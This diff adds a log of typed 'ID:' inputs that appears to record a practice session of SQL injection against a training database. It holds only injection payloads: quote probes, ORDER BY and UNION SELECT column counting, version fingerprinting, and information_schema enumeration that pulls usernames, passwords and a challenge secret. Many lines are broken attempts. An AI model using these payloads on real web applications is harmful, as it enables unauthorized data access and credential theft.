@@ -1,0 +1,192 @@
+ID:1
+ID:1
+ID:1
+ID:1
+ID:0
+ID:2
+ID:3
+ID:3'
+ID:1
+ID:1
+ID:1
+ID:2
+ID:2'
+ID:2 UNION SELECT 1,2,3
+ID:2 UNION SELECT 1,2
+ID:2 UNION SELECT 1
+ID:2' UNION SELECT 1,2 /*
+ID:2' UNION SELECT '1,2 
+ID:2' UNION SELECT '1,2,3
+ID:2' UNION SELECT '1,2,3,4
+ID:2' UNION SELECT '1,2,3,4,5
+ID:2' UNION SELECT '1,2,3,4,5,6
+ID:2' UNION SELECT '1,2,3,4,5,6,7
+ID:2' UNION SELECT '1,2
+ID:2' ORDER BY 3 --
+ID:2' ORDER BY 3 /*
+ID:2' ORDER BY 3  --
+ID:2' ORDER BY 3  --
+ID:22' ORDER BY 3; --
+ID:22' ORDER BY 3; --'
+ID:2' ORDER BY 3 ;
+ID:2 UNION SELECT 1,2,3
+ID:2 UNION SELECT 1,2,3,4
+ID:2 UNION SELECT 1,2,3,4,5
+ID:3 UNION SELECT 1,2,3,4,5
+ID:3 UNION SELECT 1
+ID:3' UNION SELECT 1,2,3 --
+ID:3' UNION SELECT 1,2,3 
+ID:3' UNION SELECT 1,2,3 
+ID:3' UNION SELECT 1,2,3 --
+ID:3' UNION SELECT 1,2,3 -- 
+ID:3' UNION SELECT 1,2 -- 
+ID:0' UNION SELECT 1,2,3 -- 
+ID:0' UNION SELECT 1,table_name,3  FROM information_schema.tables-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.tables-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns ORDER BY 1 DESC-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns%2LIMIT 1,2-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name!='ALL_PLUGINS'-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name not like '%PLUGINS'-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name not like '%PL%'-- 
+ID:0' UNION SELECT 1,dbname(),3  FROM information_schema.tables-- 
+ID:0' UNION SELECT 1,db(),3  FROM information_schema.tables-- 
+ID:0' UNION SELECT 1,db_name(),3  FROM information_schema.tables-- 
+ID:3' UNION SELECT 1,dbname(),3 -- 
+ID:3' UNION SELECT 1,database(),3 -- 
+ID:0' UNION SELECT 1,database(),3 -- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns where table_name='security'-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name not like '%PLUGINS'-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name like '%security'-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name not like '%PLUGINS'-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name not like '%SECURITY '-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name like '%SECURITY '-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name='SECURITY'-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name='SECURITY' -- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name not like '%PLUGI '-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name like '%SECU% '-- 
+ID:3' UNION SELECT 1,2,3 -- 
+ID:3' UNION SELECT 1,database(),3 -- 
+ID:0' UNION SELECT 1,database(),3 -- 
+ID:0' UNION SELECT 1,database(),@@version -- 
+ID:1
+ID:5
+ID:6
+ID:7
+ID:'
+ID:"
+ID:-
+ID:' or 1=1 --
+ID:1111
+ID:1110
+ID:10
+ID:20
+ID:15
+ID:13
+ID:12
+ID:12
+ID:''
+ID:"abc
+ID:'
+ID:'-- -
+ID:12'-- -
+ID:' or 1=1 -- -
+ID:0' or 1=1 -- -
+ID:-1' or 1=1 -- -
+ID:1
+ID:'union select sqlite_version() --
+ID:1
+ID:1
+ID:' union select 1,2 -- -
+ID:' union select 1 -- -
+ID:' union select 1,2,3 -- -
+ID:' union select 1,2,db.version() -- -
+ID:' union select 1,2,@@version -- -
+ID:' union select 1,2,* FROM information_schema.tables -- -
+ID:' union select * FROM information_schema.tables -- -
+ID:' union select 1,2,3 FROM information_schema.tables -- -
+ID:' union select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata -- -
+ID:' union select 1,2,group_concat(schema_name)+fRoM+information_schema.schemata -- -
+ID:' union select 1,2,3,group_concat(schema_name)+fRoM+information_schema.schemata -- -
+ID:' union select 1,2,group_concat(schema_name) fRoM information_schema.schemata -- -
+ID:' union select 1,2,group_concat(schema_name) fRoM information_schema.schemata -- -
+ID:' union select 1,2,group_concat(schema_name) fRoM information_schema.schemata -- -
+ID:' union select 1,2,version@2
+ID:' union select 1,2,version@2
+ID:' union select 1,2,version@2
+ID:' union select 1,2,version@2
+ID:' union select 1,2,@@version@2
+ID:' union select 1,2,@@version@2
+ID:' union select 1,2,@@version@2
+ID:' union select 1,2,@@version -- -
+ID:' union select 1,2,@@version -- -
+ID:' union select 1,2,group_concat(schema_name) from information_schema.schemata -- -
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where sqlinjection -- -
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where=sqlinjection -- -
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables  -- -
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables  -- -
+ID:'union select sqlite_version() --
+ID:'union select sqlite_version() --
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables -- -
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=security -- -
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=sys -- -
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="sys" -- -
+ID:' union select 1,2,group_concat(table_name) from information_schema.tabl
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="security" -- -
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="sqlinjection" -- -
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="challenges" -- -
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="mysql" -- -
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="challenges" -- -
+ID:12
+ID:?id=' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="challenges" -- -
+ID:?id=' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="L6TW38DIDA" -- -
+ID:?id=' union select 1,2,group_concat(data) from secret_5OR6 -- -
+ID:?id=' union select 1,2,secret_5or6 from L6TW38DIDA -- -
+ID:?id=' union select 1,2,L6TW38DIDA from security -- -
+ID:?id=' union select 1,2,L6TW38DIDA from  -- -
+ID:?id=' union select 1,2,(column_name) from L6TW38DIDA  -- -
+ID:?id=' union select 1,2,(column_name) from challenges   -- -
+ID:?id=' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="security" -- -
+ID:?id=' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users" -- -
+ID:?id=' union select 1,2,group_concat(data) from password -- -
+ID:?id=' union select 1,2,group_concat(data) from users.password -- -
+ID:?id=' union select 1,2,group_concat(data) from users -- -
+ID:?id=' union select 1,2,group_concat(data) from users.username -- -
+ID:?id=' union select 1,2,username from users -- -
+ID:?id=' union select 1,2,group_concat(username) from users -- -
+ID:?id=' union select 1,2,group_concat(username) from challenges -- -
+ID:?id=' union select 1,2,group_concat(table_name) fRoM information_schema.tables wHeRe+table_schema=security -- -
+ID:%3fid%3d'%20union%20select%201%2c2%2cgroup_concat(table_name)%20fRoM%20information_schema.tables%20wHeRe%20table_schema%3d%22security%22%20--%20-
+ID:'%20union%20select%201%2c2%2cgroup_concat(table_name)%20fRoM%20information_schema.tables%20wHeRe%20table_schema%3d%22security%22%20--%20-
+ID:'%20union%20select%201%2c2%2cgroup_concat(table_name)%20fRoM%20information_schema.tables%20wHeRe%20table_schema%3d'security'%20--%20-
+ID:?id=' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="security" -- -
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="security" -- -
+ID:' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema="referers" -- -
+ID:' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema="email" -- -
+ID:' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema="emails" -- -
+ID:' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema="users" -- -
+ID:' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users" -- -
+ID:' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="emails" -- -
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="security" -- -
+ID:' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="uagents" -- -
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="challenges" -- -
+ID:' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="L6TW38DIDA" -- -
+ID:' union select 1,2,group_concat(data) from challenges.L6TW38DIDA -- -
+ID:' union select 1,2,group_concat(secret_5OR6) from challenges.L6TW38DIDA -- -
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="challenges" -- -
+ID:a
+ID:abc
+ID:0' or 1=1 -- -
+ID:0
+ID:0' or 1=1 -- -
+ID:1' or 1=1 -- -
+ID:2' or 1=1 -- -
+ID:'
+ID: union select * --
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="challenges" -- -
+ID:' UNION SELECT 1,2-- -
+ID:' UNION SELECT 1,2,3,4-- -
+ID:' UNION SELECT 1,2,3-- -
+ID:'
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="challenges" -- -
